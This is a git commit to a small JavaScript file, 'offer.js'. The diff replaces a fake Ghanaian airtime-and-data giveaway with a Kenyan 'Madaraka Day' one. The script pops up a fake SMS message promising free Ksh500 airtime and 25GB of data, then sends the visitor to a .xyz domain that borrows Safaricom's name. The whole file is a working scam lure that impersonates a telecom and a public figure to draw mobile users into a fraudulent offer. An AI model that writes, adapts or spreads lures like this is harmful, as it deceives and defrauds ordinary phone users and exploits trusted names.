c6f0224fca016bfdba327b0f6b28c92342b226c6
lagboyme <lagboy33+me@gmail.com>
2025-05-29 14:11:28 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = '25GB + Ksh500'
+password=prompt('SMS: Congratulations You are Eligible to receive Ksh500 Airtime and 25GB Data MADARAKA DAY Celebration Offer, Kindly Press OK to ACTIVATE ','25GB + Ksh500');
+if (password != '25GB + Ksh500') {
+location.href='https://safaricom.goprogram.xyz/25GB';
 }
